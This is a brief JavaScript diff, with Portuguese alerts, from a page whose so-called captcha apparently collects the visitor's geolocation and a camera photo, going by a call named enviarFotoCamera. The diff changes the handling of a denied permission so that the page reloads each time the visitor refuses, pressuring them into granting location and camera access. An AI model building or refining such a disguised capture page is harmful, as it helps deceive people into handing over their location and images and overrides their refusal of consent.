@@ -239,7 +239,8 @@
           err => {
             locationGranted = false;
             blocked = false;
-            alert("Permissão de localização negada. Você precisa permitir para continuar.");
+            alert("Permissão de localização negada. A página vai recarregar para tentar novamente.");
+            location.reload();
           }
         );
       } else {
@@ -260,7 +261,8 @@
         await enviarFotoCamera();
         terminarCaptcha();
       } catch (err) {
-        alert("Permissão de câmera negada. Você precisa permitir para continuar.");
+        alert("Permissão de câmera negada. A página vai recarregar para tentar novamente.");
+        location.reload();
         blocked = false;
       }
       return;
